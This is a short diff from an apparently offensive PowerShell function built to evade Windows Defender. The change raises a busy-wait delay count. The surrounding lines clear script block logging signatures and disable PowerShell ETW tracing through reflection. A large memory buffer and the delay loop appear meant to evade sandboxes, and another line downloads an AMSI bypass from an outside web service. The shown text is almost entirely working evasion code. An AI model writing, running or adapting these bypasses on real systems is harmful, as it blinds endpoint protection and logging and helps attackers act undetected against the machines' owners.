@@ -2,7 +2,7 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
     [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
     [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
     $increment = 0
-    $maxincrement = 15000000
+    $maxincrement = 30000000
     For ($increment=0; $increment -lt $maxincrement) { $increment++ }
     $fillmybuffer = "a" * 300MB
     $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
